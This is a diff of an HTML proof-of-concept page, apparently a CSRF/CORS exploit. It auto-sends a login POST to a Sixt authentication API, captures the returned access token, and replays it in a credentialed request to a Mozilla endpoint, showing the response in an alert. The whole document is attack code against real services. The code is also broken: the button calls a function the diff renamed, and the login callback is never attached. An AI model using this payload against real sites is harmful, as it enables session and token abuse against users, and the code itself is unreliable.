@@ -3,8 +3,16 @@
   <body>
   <script>history.pushState('', '', '/')</script>
     <script>
-      function submitRequest()
-      {
+	function login()
+	{
+  	var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    var parse = JSON.parse(this.response);
+    window.token2 = parse.access_token;
+    setTimeout(getdata, 500);
+    }
+    };
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https:\/\/web-api.orange.sixt.com\/v1\/auth\/login", true);
         xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
@@ -17,8 +25,23 @@
           aBody[i] = body.charCodeAt(i); 
         xhr.send(new Blob([aBody]));
       }
-    </script>
-    <form action="#">
+      function getdata()
+{
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    document.getElementById("demo").innerHTML = alert(this.responseText);
+    window.response = this.responseText;
+    }
+  };
+  xhttp.open("GET", "https://normandy.cdn.mozilla.net/api/v1/", true);
+  xhttp.withCredentials = true;
+  xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+  xhttp.setRequestHeader("Authorization", "Bearer "+token2);
+  xhttp.send();
+}
+      </script>
+      <form action="#">
       <input type="button" value="Submit request" onclick="submitRequest();" />
     </form>
   </body>
